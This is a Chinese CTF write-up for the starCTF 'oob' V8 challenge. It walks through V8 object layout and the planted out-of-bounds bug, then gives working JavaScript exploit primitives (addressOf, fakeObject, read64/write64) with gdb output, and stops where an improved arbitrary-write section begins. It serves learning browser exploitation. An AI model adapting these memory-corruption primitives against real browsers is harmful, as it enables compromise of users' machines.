# chrome study by v8 oob

阅读量 **319546**

|![](https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png)

发布时间 : 2020-10-23 10:00:20

 **x**

##### 译文声明

本文是翻译文章

译文仅供参考，具体内容表达以及含义原文为准。

![](https://p2.ssl.qhimg.com/t01d4d2ae01c8743d9e.png)

## 前言

> 学习浏览器，从v8入手，这道题有比较详细的资料，作为入门题非常有优势。

## 环境搭建

###  基础v8的环境搭建

使用的环境：ubuntu 18.04

v8环境搭建：<https://warm-winter.github.io/2020/10/11/v8%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/>

###  解题的搭建

一般浏览器的出题有两种

  * 一种是diff修改v8引擎源代码，人为制造出一个漏洞，
  * 另一种是直接采用某个cve漏洞。一般在大型比赛中会直接采用第二种方式，更考验选手的实战能力。

出题者通常会提供一个diff文件，或直接给出一个编译过diff补丁后的浏览器程序。如果只给了一个diff文件，就需要我们自己去下载相关的commit源码，然后本地打上diff补丁，编译出浏览器程序，再进行本地调试。

比如starctf中的oob题目给出了一个diff文件：

    
    
    diff --git a/src/bootstrapper.cc b/src/bootstrapper.cc
    index b027d36..ef1002f 100644
    --- a/src/bootstrapper.cc
    +++ b/src/bootstrapper.cc
    @@ -1668,6 +1668,8 @@ void Genesis::InitializeGlobal(Handle<JSGlobalObject> global_object,
                               Builtins::kArrayPrototypeCopyWithin, 2, false);
         SimpleInstallFunction(isolate_, proto, "fill",
                               Builtins::kArrayPrototypeFill, 1, false);
    +    SimpleInstallFunction(isolate_, proto, "oob",
    +                          Builtins::kArrayOob,2,false);
         SimpleInstallFunction(isolate_, proto, "find",
                               Builtins::kArrayPrototypeFind, 1, false);
         SimpleInstallFunction(isolate_, proto, "findIndex",
         [...]
    

以上截取了第一部分，是对/path/v8/src/bootstrapper.cc做了修改。

在/path/v8下执行以下的命令，将diff文件加入到v8中源代码分支中：

    
    
    git apply /path/oob.diff
    

我们找到`bootstrapper.cc`文件，搜索`SimpleInstallFunction(isolate_, proto,
"fill",`，发现下面已经将oob函数加入进去，patch成功。

![](https://p0.ssl.qhimg.com/t01d04545db320fdc2f.png)

最后编译出增加了diff补丁的v8程序调试即可。

###  环境问题

正常来说，debug版本和release版本都能使用，但是调试这道题的时候，碰到了如下的问题：

release版本正常运行

![](https://p3.ssl.qhimg.com/t01013f98a5c23c2cbc.png)

debug版本报错

![](https://p3.ssl.qhimg.com/t018ccea732b58ee064.png)

> e3pem师傅的博客是这样解释的：
>
>
> 了解到是DCHECK宏的问题，然而对宏修改或是注释之后发现编译出来的d8执行还是会出现问题(这个时候已经开始怀疑人生了)。后来仔细的观察了一下师傅们写的文章，发现里面调试oob的时候都是用的release版本，之前也试过release版本的d8确实不会出现问题，所以很可能debug版本的d8就是不行，而别人文章里面出现的debug版本的d8的目的就是为了了解v8的数据是怎么存储的。所以这里正确的用法应该是用release版本进行调试，用debug版本来辅助分析。

## v8的基础知识

v8编译后二进制名称叫d8而不是v8。

###  调试

####  1.allow-natives-syntax选项

功能：定义了一些v8运行时支持函数，主要有以下两个：

    
    
    %DebugPrint(obj) 输出对象地址
    %SystemBreak() 触发调试中断主要结合gdb等调试器使用
    

使用：

    
    
    //方法一
    winter@ubuntu:~/v8/v8/out.gn/x64.debug$ ./d8 --allow-natives-syntax 
    
    //方法二
    winter@ubuntu:~/v8/v8/out.gn/x64.debug$ gdb ./d8 
    [...]
    pwndbg> set args --allow-natives-syntax test.js
    

####  2.job命令

功能：可视化显示JavaScript对象的内存结构.

gdb下使用：job 对象地址

显示如下，具体v8的内存结构，稍后“v8对象结构”里进一步解释。

    
    
    pwndbg> job 0x4f9d210dd59
    0x4f9d210dd59: [JSArray]
     - map: 0x257bfd042d99 <Map(PACKED_SMI_ELEMENTS)> [FastProperties]
     - prototype: 0x355e47bd1111 <JSArray[0]>
     - elements: 0x04f9d210dce9 <FixedArray[3]> [PACKED_SMI_ELEMENTS (COW)]
     - length: 3
     - properties: 0x26cfa9fc0c71 <FixedArray[0]> {
        #length: 0x1da9ebe001a9 <AccessorInfo> (const accessor descriptor)
     }
     - elements: 0x04f9d210dce9 <FixedArray[3]> {
               0: 1
               1: 2
               2: 3
     }
    

####  3.telescope

功能：查看一下内存数据

使用：telescope 查看地址 （长度）

> （）表示里面的可以没有

###  v8知识点

####  指针标记

v8使用指针标记机制来区分 **指针** ， **双精度数** 和 **Smis** （代表）`immediate small integer`。

    
    
    Double: Shown as the 64-bit binary representation without any changes
    Smi: Represented as value << 32, i.e 0xdeadbeef is represented as 0xdeadbeef00000000
    Pointers: Represented as addr & 1. 0x2233ad9c2ed8 is represented as 0x2233ad9c2ed9
    

所以，v8中，如果一个值表示的是指针，那么会将该值的最低bit设置为1，但其实真实的值需要减去1。

job直接给对象地址就行，telescope的时候，需要给真实值，需要-1。

####  v8对象结构

在/path/v8/out.gn/x64.debug下创建一个test.js

    
    
    var a = [1,2,3];
    %DebugPrint(a);
    %SystemBreak()
    
    
    
    winter@ubuntu:~/v8/v8/out.gn/x64.debug$ gdb ./d8 
    [...]
    Reading symbols from ./d8...done.
    pwndbg> set args --allow-natives-syntax test.js 
    pwndbg> r
    [...]
    DebugPrint: 0x31c7fffcdd59: [JSArray]
    [...]
    pwndbg> job 0x31c7fffcdd59
    0x31c7fffcdd59: [JSArray]
     - map: 0x315768442d99 <Map(PACKED_SMI_ELEMENTS)> [FastProperties]
     - prototype: 0x3f6dffcd1111 <JSArray[0]>
     - elements: 0x31c7fffcdce9 <FixedArray[3]> [PACKED_SMI_ELEMENTS (COW)]
     - length: 3
     - properties: 0x176329f00c71 <FixedArray[0]> {
        #length: 0x3ae23f8001a9 <AccessorInfo> (const accessor descriptor)
     }
     - elements: 0x31c7fffcdce9 <FixedArray[3]> {
               0: 1
               1: 2
               2: 3
     }
    pwndbg> job 0x31c7fffcdce9
    0x31c7fffcdce9: [FixedArray]
     - map: 0x176329f00851 <Map>
     - length: 3
               0: 1
               1: 2
               2: 3
    

所以，一个对象有如下属性：

  * map：定义了如何访问对象
  * prototype：对象的原型（如果有）
  * elements：对象的地址
  * length：长度
  * properties：属性，存有map和length

分析：

对象里存储的数据是在elements指向的内存区域的，而且是在对象的上面。也就是说，在内存申请上，v8先申请了一块内存存储元素内容，然后申请了一块内存存储这个数组的对象结构，对象中的elements指向了存储元素内容的内存地址。

![](https://p2.ssl.qhimg.com/t01b9c39c51c610717b.png)

####  map属性详解

因为稍后需要用到，，所以放在这里讲一下

    
    
    pwndbg> job 0x176329f00801
    0x176329f00801: [Map]
     - type: FIXED_ARRAY_TYPE
     - instance size: variable
     - elements kind: HOLEY_ELEMENTS
     - unused property fields: 0
     - enum length: invalid
     - stable_map
     - non-extensible
     - back pointer: 0x176329f004d1 <undefined>
     - prototype_validity cell: 0
     - instance descriptors (own) #0: 0x176329f00259 <DescriptorArray[0]>
     - layout descriptor: (nil)
     - prototype: 0x176329f001d9 <null>
     - constructor: 0x176329f001d9 <null>
     - dependent code: 0x176329f002c1 <Other heap object (WEAK_FIXED_ARRAY_TYPE)>
     - construction counter: 0
    

对象的map（数组是对象）是一种数据结构，其中包含以下信息：

  * 对象的动态类型，即String，Uint8Array，HeapNumber等。
  * 对象的大小（以字节为单位）
  * 对象的属性及其存储位置
  * 数组元素的类型，例如，unboxed的双精度数或带标记的指针
  * 对象的原型（如果有）

属性名称通常存储在Map中，而属性值则存储在对象本身中几个可能区域之一中。然后，map将提供属性值在相应区域中的确切位置。

**本质上，映射定义了应如何访问对象。**

**重点**

  * 对于对象数组：存储的是每个对象的地址
  * 对于浮点数组：以浮点数形式存储数值

所以，如果将对象数组的map换成浮点数组 => 就变成了浮点数组，会以浮点数的形式存储对象的地址；如果将对浮点组的map换成对象数组 =>
就变成了对象数组，打印浮点数存储的地址。这实际上就是类型混淆的内容。

####  对象和对象数组

有时候想着想着有点乱，调试一下。

一个浮点数组、整数数组和一个对象数组。

    
    
    var a = [1.1,2.2,3.3];
    %DebugPrint(a);
    %SystemBreak();
    
    var b = [1,2,3];
    %DebugPrint(b);
    %SystemBreak();
    
    var obj_array = [a,b];
    %DebugPrint(obj_array);
    %SystemBreak();
    
    
    
    winter@ubuntu:~/v8/v8/out.gn/x64.debug$ gdb ./d8 
    [...]
    pwndbg> set args --allow-natives-syntax test.js 
    pwndbg> r
    [...]
    //浮点数组
    DebugPrint: 0x23ddebc4de71: [JSArray]
     - map: 0x13e6d5782ed9 <Map(PACKED_DOUBLE_ELEMENTS)> [FastProperties]
     - prototype: 0x1bb893151111 <JSArray[0]>
     - elements: 0x23ddebc4de49 <FixedDoubleArray[3]> [PACKED_DOUBLE_ELEMENTS]
     - length: 3
     - properties: 0x1574a0580c71 <FixedArray[0]> {
        #length: 0x19fc51e401a9 <AccessorInfo> (const accessor descriptor)
     }
     - elements: 0x23ddebc4de49 <FixedDoubleArray[3]> {
               0: 1.1
               1: 2.2
               2: 3.3
     }
    [...]
    pwndbg> c
    Continuing.
    //整型数组
    DebugPrint: 0x23ddebc4de91: [JSArray]
     - map: 0x13e6d5782d99 <Map(PACKED_SMI_ELEMENTS)> [FastProperties]
     - prototype: 0x1bb893151111 <JSArray[0]>
     - elements: 0x23ddebc4ddb9 <FixedArray[3]> [PACKED_SMI_ELEMENTS (COW)]
     - length: 3
     - properties: 0x1574a0580c71 <FixedArray[0]> {
        #length: 0x19fc51e401a9 <AccessorInfo> (const accessor descriptor)
     }
     - elements: 0x23ddebc4ddb9 <FixedArray[3]> {
               0: 1
               1: 2
               2: 3
     }
    [...]
    pwndbg> c
    Continuing.
    //对象数组
    DebugPrint: 0x23ddebc4ded1: [JSArray]
     - map: 0x13e6d5782f79 <Map(PACKED_ELEMENTS)> [FastProperties]
     - prototype: 0x1bb893151111 <JSArray[0]>
     - elements: 0x23ddebc4deb1 <FixedArray[2]> [PACKED_ELEMENTS]
     - length: 2
     - properties: 0x1574a0580c71 <FixedArray[0]> {
        #length: 0x19fc51e401a9 <AccessorInfo> (const accessor descriptor)
     }
     - elements: 0x23ddebc4deb1 <FixedArray[2]> {
               0: 0x23ddebc4de71 <JSArray[3]>//存储的是浮点数组的地址
               1: 0x23ddebc4de91 <JSArray[3]>//存储的是整型数组的地址
     }
    

也就是说，对象数组里面，存储的是别的对象的地址，这里存储的是浮点数组和整型数组的地址

## 漏洞分析

分析给定文件中的oob.diff,左边行开头的地方，表示diff文件增加的内容

> 该diff文件实际就是增加了一个oob函数。主要分为三部分：定义、实现和关联。

**定义**

> 为数组添加名为oob的内置函数（就是别人调用的话），内部调用的函数名是kArrayOob（实现oob的函数）
    
    
    src/bootstrapper.cc
    +    SimpleInstallFunction(isolate_, proto, "oob",
    +                          Builtins::kArrayOob,2,false);
    

**实现**

>   * 函数将首先检查参数的数量是否大于2（第一个参数始终是`this`参数）。如果是，则返回undefined。
>   *
> 如果只有一个参数（`this`），它将数组转换成`FixedDoubleArray`，然后返回array[length]（也就是以浮点数形式返回array[length]）
>   * 如果有两个参数（`this`和`value`），它以float形式将`value`写入`array[length]`。
>

    
    
    src/builtins/builtins-array.cc
    +BUILTIN(ArrayOob){
    +    uint32_t len = args.length();
    +    if(len > 2) return ReadOnlyRoots(isolate).undefined_value();
    +    Handle<JSReceiver> receiver;
    +    ASSIGN_RETURN_FAILURE_ON_EXCEPTION(
    +            isolate, receiver, Object::ToObject(isolate, args.receiver()));
    +    Handle<JSArray> array = Handle<JSArray>::cast(receiver);
    +    FixedDoubleArray elements = FixedDoubleArray::cast(array->elements());
    +    uint32_t length = static_cast<uint32_t>(array->length()->Number());
    +    if(len == 1){
    +        //read
    +        return *(isolate->factory()->NewNumber(elements.get_scalar(length)));
    +    }else{
    +        //write
    +        Handle<Object> value;
    +        ASSIGN_RETURN_FAILURE_ON_EXCEPTION(
    +                isolate, value, Object::ToNumber(isolate, args.at<Object>(1)));
    +        elements.set(length,value->Number());
    +        return ReadOnlyRoots(isolate).undefined_value();
    +    }
    +}
    

**重点**

漏洞就出在这个函数里面

  * 如果给一个参数，返回了array[length]
  * 如果给两个参数，将给定的参数写入array[length]

很显然array[length]这里冒了，访问到了数组后面的内存区域。调试看一下后面这个内存存储什么信息。

使用debug版本

    
    
    //test.js
    var a = [1.1,2.2,3.3];
    %DebugPrint(a);
    %SystemBreak();
    
    
    
    winter@ubuntu:~/v8/v8/out.gn/x64.debug$ gdb ./d8 
    [...]
    pwndbg> set args --allow-natives-syntax test.js 
    pwndbg> r
    [...]
    DebugPrint: 0x71b3a0cde29: [JSArray]
     - map: 0x288120f02ed9 <Map(PACKED_DOUBLE_ELEMENTS)> [FastProperties]
     - prototype: 0x3086d0311111 <JSArray[0]>
     - elements: 0x071b3a0cde01 <FixedDoubleArray[3]> [PACKED_DOUBLE_ELEMENTS]
     - length: 3
     - properties: 0x109193c80c71 <FixedArray[0]> {
        #length: 0x2f6f5d1801a9 <AccessorInfo> (const accessor descriptor)
     }
     - elements: 0x071b3a0cde01 <FixedDoubleArray[3]> {
               0: 1.1
               1: 2.2
               2: 3.3
     }
    0x288120f02ed9: [Map]
     - type: JS_ARRAY_TYPE
     - instance size: 32
     - inobject properties: 0
     - elements kind: PACKED_DOUBLE_ELEMENTS
     - unused property fields: 0
     - enum length: invalid
     - back pointer: 0x288120f02e89 <Map(HOLEY_SMI_ELEMENTS)>
     - prototype_validity cell: 0x2f6f5d180609 <Cell value= 1>
     - instance descriptors #1: 0x3086d0311f49 <DescriptorArray[1]>
     - layout descriptor: (nil)
     - transitions #1: 0x3086d0311eb9 <TransitionArray[4]>Transition array #1:
         0x109193c84ba1 <Symbol: (elements_transition_symbol)>: (transition to HOLEY_DOUBLE_ELEMENTS) -> 0x288120f02f29 <Map(HOLEY_DOUBLE_ELEMENTS)>
    
     - prototype: 0x3086d0311111 <JSArray[0]>
     - constructor: 0x3086d0310ec1 <JSFunction Array (sfi = 0x2f6f5d18aca1)>
     - dependent code: 0x109193c802c1 <Other heap object (WEAK_FIXED_ARRAY_TYPE)>
     - construction counter: 0
    [...]
    //查看elements的内存地址
    pwndbg> telescope 0x071b3a0cde01-1
    00:0000│   0x71b3a0cde00 —▸ 0x109193c814f9 ◂— 0x109193c801
    01:0008│   0x71b3a0cde08 ◂— 0x300000000
    02:0010│   0x71b3a0cde10 ◂— 0x3ff199999999999a
    03:0018│   0x71b3a0cde18 ◂— 0x400199999999999a
    04:0020│   0x71b3a0cde20 ◂— 0x400a666666666666 ('ffffff\n@')
    05:0028│   0x71b3a0cde28 —▸ 0x288120f02ed9 ◂— 0x40000109193c801
    06:0030│   0x71b3a0cde30 —▸ 0x109193c80c71 ◂— 0x109193c808
    07:0038│   0x71b3a0cde38 —▸ 0x71b3a0cde01 ◂— 0x109193c814
    
    //element+10开始的地方，存储的是数据
    pwndbg> p {double } 0x71b3a0cde10
    $1 = 1.1000000000000001
    pwndbg> p {double } 0x71b3a0cde18
    $2 = 2.2000000000000002
    pwndbg> p {double } 0x71b3a0cde20
    $3 = 3.2999999999999998
    
    //查看冒出来地址里存储的数据，发现存储的是map
    pwndbg> job 0x288120f02ed9
    0x288120f02ed9: [Map]
     - type: JS_ARRAY_TYPE
     - instance size: 32
     - inobject properties: 0
     - elements kind: PACKED_DOUBLE_ELEMENTS
     - unused property fields: 0
     - enum length: invalid
     - back pointer: 0x288120f02e89 <Map(HOLEY_SMI_ELEMENTS)>
     - prototype_validity cell: 0x2f6f5d180609 <Cell value= 1>
     - instance descriptors #1: 0x3086d0311f49 <DescriptorArray[1]>
     - layout descriptor: (nil)
     - transitions #1: 0x3086d0311eb9 <TransitionArray[4]>Transition array #1:
         0x109193c84ba1 <Symbol: (elements_transition_symbol)>: (transition to HOLEY_DOUBLE_ELEMENTS) -> 0x288120f02f29 <Map(HOLEY_DOUBLE_ELEMENTS)>
    
     - prototype: 0x3086d0311111 <JSArray[0]>
     - constructor: 0x3086d0310ec1 <JSFunction Array (sfi = 0x2f6f5d18aca1)>
     - dependent code: 0x109193c802c1 <Other heap object (WEAK_FIXED_ARRAY_TYPE)>
     - construction counter: 0
    

综上，我们得到的是读写map和修改map的功能

我们在release版本下实际调试

    
    
    var a = [1.1,2.2,3.3];
    %DebugPrint(a);
    %SystemBreak();
    
    var data = a.oob();
    console.log("[*] oob return data:" + data.toString());
    %SystemBreak();
    
    a.oob(2);
    %SystemBreak();
    
    
    
    winter@ubuntu:~/v8/v8/out.gn/x64.release$ gdb ./d8 
    [...]
    pwndbg> set args --allow-natives-syntax test.js 
    pwndbg> r
    [...]
    0x2c5f52b0de29 <JSArray[3]>
    //打印对象内存地址
    pwndbg> telescope 0x2c5f52b0de29-1
    00:0000│   0x2c5f52b0de28 —▸ 0x344502282ed9 ◂— 0x400003ee9994c01    <= 对象的map                                    nmap
    01:0008│   0x2c5f52b0de30 —▸ 0x3ee9994c0c71 ◂— 0x3ee9994c08         <= prototype    
    02:0010│   0x2c5f52b0de38 —▸ 0x2c5f52b0de01 ◂— 0x3ee9994c14            <= element
    03:0018│   0x2c5f52b0de40 ◂— 0x300000000                            <= length
    04:0020│   0x2c5f52b0de48 ◂— 0x0
    
    //打印element内存地址
    pwndbg> telescope 0x2c5f52b0de01-1
    00:0000│   0x2c5f52b0de00 —▸ 0x3ee9994c14f9 ◂— 0x3ee9994c01             
    01:0008│   0x2c5f52b0de08 ◂— 0x300000000                             <= length
    02:0010│   0x2c5f52b0de10 ◂— 0x3ff199999999999a                         <= 第一个值
    03:0018│   0x2c5f52b0de18 ◂— 0x400199999999999a                         <= 第二个值
    04:0020│   0x2c5f52b0de20 ◂— 0x400a666666666666 ('ffffff\n@')        <= 第二个值
    05:0028│   0x2c5f52b0de28 —▸ 0x344502282ed9 ◂— 0x400003ee9994c01     <=对象的map
    06:0030│   0x2c5f52b0de30 —▸ 0x3ee9994c0c71 ◂— 0x3ee9994c08
    07:0038│   0x2c5f52b0de38 —▸ 0x2c5f52b0de01 ◂— 0x3ee9994c14
    
    pwndbg> p {double } 0x71b3a0cde10
    $1 = 1.1000000000000001
    pwndbg> p {double } 0x71b3a0cde18
    $2 = 2.2000000000000002
    pwndbg> p {double } 0x71b3a0cde20
    $3 = 3.2999999999999998
    
    pwndbg> c
    Continuing.
    [*] oob return data:2.8394443558087e-310//和泄漏出来的一样
    
    pwndbg> p {double } 0x2c5f52b0de28
    $2 = 2.8394443558087202e-310
    
    pwndbg> c
    Continuing.
    pwndbg> telescope 0x2c5f52b0de01-1
    00:0000│   0x2c5f52b0de00 —▸ 0x3ee9994c14f9 ◂— 0x3ee9994c01
    01:0008│   0x2c5f52b0de08 ◂— 0x300000000
    02:0010│   0x2c5f52b0de10 ◂— 0x3ff199999999999a
    03:0018│   0x2c5f52b0de18 ◂— 0x400199999999999a
    04:0020│   0x2c5f52b0de20 ◂— 'ffffff\n@'
    05:0028│   0x2c5f52b0de28 ◂— 0x4000000000000000
    06:0030│   0x2c5f52b0de30 —▸ 0x3ee9994c0c71 ◂— 0x3ee9994c08
    07:0038│   0x2c5f52b0de38 —▸ 0x2c5f52b0de01 ◂— 0x3ee9994c14
    pwndbg> p {double } 0x2c5f52b0de28
    $3 = 2//被覆盖了
    

**关联**

> 为kArrayOob类型做了与实现函数的关联：
    
    
    src/builtins/builtins-definitions.h
    +  CPP(ArrayOob)                                                                \
    
    /src/compiler/typer.cc
           return Type::Receiver();
         case Builtins::kArrayUnshift:
           return t->cache_->kPositiveSafeInteger;
    +    case Builtins::kArrayOob:
    +      return Type::Receiver();
    

## 漏洞利用

###  类型混淆

由于v8完全依赖Map类型对js对象进行解析。

所以，我们通过修改对象的map，将对象数组的map设置为浮点数组的map，就能让v8解析原来的对象数组的时候，解析成为浮点数组，反之同理。由于两种数组内部存储的不同，可以实现一些小功能。

  * 对象数组存储的是每个对象的地址，也就是对象数组存的是地址。
  * 浮点数组存储的是浮点型是的数值。

####  addressOf

> 泄露某个对象的内存地址，日后可以实现任意地址读的功能。

因为对象数组存储的是地址，但是如果v8解析是对象数组的话，肯定就不会输出这个地址，而是找到这个对象再操作。但是，如果，让v8误以为这是一个浮点数组，那么，v8就把把这个地址当作是浮点数，以浮点数的形式将对象数组里面存储的对象地址输出了。

所以，步骤如下：

1.拿到要泄漏的地址

2.把这个地址，覆盖已经创建好的对象数组第一个元素obj_array[0]（让地址成为对象数组的一员）

3.将对象数组的map替换为浮点数组的map

4.输出数组的第一个元素，此时，就会按照浮点形式，将地址里的内容输出出来。

    
    
    var obj = {"a": 1};
    var obj_array = [obj];
    var float_array = [1.1];
    var obj_array_map = obj_array.oob();//oob函数出来的就是map
    var float_array_map = float_array.oob();
    
    // 泄露某个object的地址
    function addressOf(obj_to_leak)
    {
        obj_array[0] = obj_to_leak;
        obj_array.oob(float_array_map);
        let obj_addr = f2i(obj_array[0]) - 1n;//泄漏出来的地址-1才是真实地址
        obj_array.oob(obj_array_map); // 还原array类型以便后续继续使用
        return obj_addr;
    }
    

####  fakeObject

> 将指定内存地址强制转换为一个js对象，日后可以实现任意地址写的功能。

现在，有了地址，地址是一个整数，整数可以直接变成以浮点数表示，但是不能变成对象，所以还是需要混淆。

步骤：

1.拿到地址，转换为浮点数表示。

2.放入浮点数组第一个位置中。

3.将浮点数组的map替换为对象数组的map

4.数组的第一个位置上，内存地址就已经变成一个js对象了。

    
    
    function fakeObject(addr_to_fake)
    {
        float_array[0] = i2f(addr_to_fake + 1n);//地址需要+1才是v8中的正确表达方式
        float_array.oob(obj_array_map);
        let faked_obj = float_array[0];
        float_array.oob(float_array_map); // 还原array类型以便后续继续使用
        return faked_obj;
    }
    

####  辅助的工具函数

浮点数转整数、整数转浮点数、字节串表示整数

实现方法：开辟一块空间，创建两个数组，分别是浮点数组float64和整数数组bigUint64，他们公用创造的那块空间。

这样，根据原来的形式放入对应的数组，用转换的数组输出即可。

例如：f2i()，要将浮点数转换为整数，只要将浮点数放入浮点数组，然后用整数数组输出，因为空间是一个，所以，输入输出的是同一个值，但由于数组的属性不同，会按数组的属性进行解释，进来的时候是浮点数，比如存入了0001H单元，然后输出的时候，还会读这个0001H单元，但是这个时候，用的是整数数组，所以会把它以整数的格式输出。

    
    
    var buf =new ArrayBuffer(16);
    var float64 = new Float64Array(buf);
    var bigUint64 = new BigUint64Array(buf);
    // 浮点数转换为64位无符号整数
    function f2i(f)
    {
        float64[0] = f;
        return bigUint64[0];
    }
    // 64位无符号整数转为浮点数
    function i2f(i)
    {
        bigUint64[0] = i;
        return float64[0];
    }
    // 64位无符号整数转为16进制字节串
    function hex(i)
    {
        return i.toString(16).padStart(16, "0");
    }
    

整合在一起调试：

    
    
    // ××××××××1. 无符号64位整数和64位浮点数的转换代码××××××××
    var buf = new ArrayBuffer(16);
    var float64 = new Float64Array(buf);
    var bigUint64 = new BigUint64Array(buf);
    // 浮点数转换为64位无符号整数
    function f2i(f)
    {
        float64[0] = f;
        return bigUint64[0];
    }
    // 64位无符号整数转为浮点数
    function i2f(i)
    {
        bigUint64[0] = i;
        return float64[0];
    }
    // 64位无符号整数转为16进制字节串
    function hex(i)
    {
        return i.toString(16).padStart(16, "0");
    }
    // ××××××××2. addressOf和fakeObject的实现××××××××
    var obj = {"a": 1};
    var obj_array = [obj];
    var float_array = [1.1];
    var obj_array_map = obj_array.oob();//oob函数出来的就是map
    var float_array_map = float_array.oob();
    
    // 泄露某个object的地址
    function addressOf(obj_to_leak)
    {
        obj_array[0] = obj_to_leak;
        obj_array.oob(float_array_map);
        let obj_addr = f2i(obj_array[0]) - 1n;//泄漏出来的地址-1才是真实地址
        obj_array.oob(obj_array_map); // 还原array类型以便后续继续使用
        return obj_addr;
    }
    function fakeObject(addr_to_fake)
    {
        float_array[0] = i2f(addr_to_fake + 1n);//地址需要+1才是v8中的正确表达方式
        float_array.oob(obj_array_map);
        let faked_obj = float_array[0];
        float_array.oob(float_array_map); // 还原array类型以便后续继续使用
        return faked_obj;
    }
    // ××××××××3. 测试××××××××
    var test_obj = {};
    %DebugPrint(test_obj);
    var test_obj_addr = addressOf(test_obj);
    console.log("[*] leak object addr: 0x" + hex(test_obj_addr));
    %SystemBreak();
    
    
    
    pwndbg> r
    [...]
    0x189f4fdcf201 <Object map = 0x2ded805c0459>
    [*] leak object addr: 0x0000189f4fdcf200
    

成功泄漏对象的地址。同样，利用fakeObject可以将某个内存地址转换为一个object对象。

###  任意地址读写

>
> 我们首先构造一个假的数组对象，我们可以用fakeObject将其转换为一个object对象。因为自己构造的elements指针是可控的，而这个指针是指向存储数组元素内容的内存地址。所以，只要在elements上放入我们想要读写的地址，就可以用对象进行读写操作了。

步骤：

1.利用可控内存，伪造自己的对象结构。

2.将自己伪造的对象结构转换为真的对象。

![](https://p0.ssl.qhimg.com/t01806e33d17dbf9d7b.png)

我们伪造的是一个对象在内存中的表示，只有这样，elements才是我们自己可以填的。通过addressOf找到是，伪造的对象数组在内存中的地址，也就是他的对象结构开头，真实存储的内容在
**泄漏的地址-伪造的长度（6×0x8）** ，然后我们要让v8认为真实存储的内容是一个对象，所以对 **泄漏的地址-伪造的长度（6×0x8）**
做fakeObject，那么，我们构造的这个数组，就真的成为了一个对象在内存的表示。

3.任意地址读。给定的地址是要读的地址，elements在读写的数据-0x10。把这个伪造的elements给伪造的内存，然后利用上述第二步，变成一个对象（fake_object是用fake_array出来的），读取对象的元素，就是地址的内容了。

![](https://p2.ssl.qhimg.com/t01ec0adf6fe9d3e5a8.png)

4.任意地址写也是一样。把地址变成一个对象，那么要写入的地址就是我们对象的数据了。

    
    
    // read & write anywhere
    // 这是一块我们可以控制的内存
    var fake_array = [                //伪造一个对象
        float_array_map,
        i2f(0n),
        i2f(0x41414141n),// fake obj's elements ptr
        i2f(0x1000000000n),
        1.1,
        2.2,
    ];
    
    // 获取到这块内存的地址
    var fake_array_addr = addressOf(fake_array);
    // 将可控内存转换为对象
    var fake_object_addr = fake_array_addr - 0x30;
    var fake_object = fakeObject(fake_object_addr);
    // 任意地址读
    function read64(addr)
    {
        fake_array[2] = i2f(addr - 0x10n + 0x1n);
        let leak_data = f2i(fake_object[0]);
        return leak_data;
    }
    // 任意地址写
    function write64(addr, data)
    {
        fake_array[2] = i2f(addr - 0x10n + 0x1n);
        fake_object[0] = i2f(data);    
    }
    

整合测试一下：

    
    
    // ××××××××1. 无符号64位整数和64位浮点数的转换代码××××××××
    var buf = new ArrayBuffer(16);
    var float64 = new Float64Array(buf);
    var bigUint64 = new BigUint64Array(buf);
    // 浮点数转换为64位无符号整数
    function f2i(f)
    {
        float64[0] = f;
        return bigUint64[0];
    }
    // 64位无符号整数转为浮点数
    function i2f(i)
    {
        bigUint64[0] = i;
        return float64[0];
    }
    // 64位无符号整数转为16进制字节串
    function hex(i)
    {
        return i.toString(16).padStart(16, "0");
    }
    // ××××××××2. addressOf和fakeObject的实现××××××××
    var obj = {"a": 1};
    var obj_array = [obj];
    var float_array = [1.1];
    var obj_array_map = obj_array.oob();//oob函数出来的就是map
    var float_array_map = float_array.oob();
    
    // 泄露某个object的地址
    function addressOf(obj_to_leak)
    {
        obj_array[0] = obj_to_leak;
        obj_array.oob(float_array_map);
        let obj_addr = f2i(obj_array[0]) - 1n;//泄漏出来的地址-1才是真实地址
        obj_array.oob(obj_array_map); // 还原array类型以便后续继续使用
        return obj_addr;
    }
    function fakeObject(addr_to_fake)
    {
        float_array[0] = i2f(addr_to_fake + 1n);//地址需要+1才是v8中的正确表达方式
        float_array.oob(obj_array_map);
        let faked_obj = float_array[0];
        float_array.oob(float_array_map); // 还原array类型以便后续继续使用
        return faked_obj;
    }
    // ××××××××3.read & write anywhere××××××××
    // 这是一块我们可以控制的内存
    var fake_array = [                //伪造一个对象
        float_array_map,
        i2f(0n),
        i2f(0x41414141n),// fake obj's elements ptr
        i2f(0x1000000000n),
        1.1,
        2.2,
    ];
    
    // 获取到这块内存的地址
    var fake_array_addr = addressOf(fake_array);
    // 将可控内存转换为对象
    var fake_object_addr = fake_array_addr - 0x30n;
    var fake_object = fakeObject(fake_object_addr);
    // 任意地址读
    function read64(addr)
    {
        fake_array[2] = i2f(addr - 0x10n + 0x1n);
        let leak_data = f2i(fake_object[0]);
        return leak_data;
    }
    // 任意地址写
    function write64(addr, data)
    {
        fake_array[2] = i2f(addr - 0x10n + 0x1n);
        fake_object[0] = i2f(data);    
    }
    // ××××××××4. 测试××××××××
    var a = [1.1,2.2,3.3];
    var address = addressOf(a);
    var read = read64(address);
    console.log("[*]read 0x"+hex(address)+":0x"+hex(read));
    %DebugPrint(a);
    %SystemBreak();
    write64(address,0x01020304n);
    %SystemBreak();
    

创建一个对象，找到他的地址。

读取对象地址存储的内容，然后改写对象地址存储的内容。

    
    
    pwndbg> r
    [...]
    [*]read 0x000031f15738fa50:0x0000369d9e942ed9//读取出来对象地址存的数据是0x0000369d9e942ed9
    0x31f15738fa51 <JSArray[3]>
    //查看对象地址的内存，发现和读取出来的一样
    pwndbg> telescope 0x000031f15738fa50
    00:0000│   0x31f15738fa50 —▸ 0x369d9e942ed9 ◂— 0x400002d1469d401 <=对象地址，存储的内容被读取
    01:0008│   0x31f15738fa58 —▸ 0x2d1469d40c71 ◂— 0x2d1469d408
    02:0010│   0x31f15738fa60 —▸ 0x31f15738fa29 ◂— 0x2d1469d414
    
    pwndbg> c
    Continuing.
    
    pwndbg> telescope 0x000031f15738fa50
    00:0000│   0x31f15738fa50 ◂— 0x1020304                <=对象地址，存储的内容被改写
    01:0008│   0x31f15738fa58 —▸ 0x2d1469d40c71 ◂— 0x2d1469d408
    02:0010│   0x31f15738fa60 —▸ 0x31f15738fa29 ◂— 0x2d1469d414
    

成功！！

####  任意写改进

问题：通过上面的方式任意地址写，在写0x7fxxxx这样的高地址的时候会出现问题，地址的低位会被修改，导致出现访问异常。

